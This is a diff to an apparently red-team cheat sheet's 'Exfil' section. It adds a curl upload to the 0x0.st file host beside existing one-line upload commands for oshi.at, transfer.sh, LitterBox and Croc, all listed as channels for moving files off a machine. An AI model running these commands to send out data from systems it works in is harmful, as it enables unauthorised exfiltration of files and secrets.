@@ -2506,6 +2506,7 @@ Exfil<a id="cloudexfil"></a>
 2. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
 1. [Mega](https://mega.io/cmd)
 2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
+3. [0x0.at](https://0x0.st) - `curl -F'file=@foo.txt'  https://0x0.st/`
 5. [Transfer.sh](https://transfer.sh/) - `curl -T foo.txt https://transfer.sh`
 6. [LitterBox](https://litterbox.catbox.moe/tools.php) - `curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php`  
 7. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
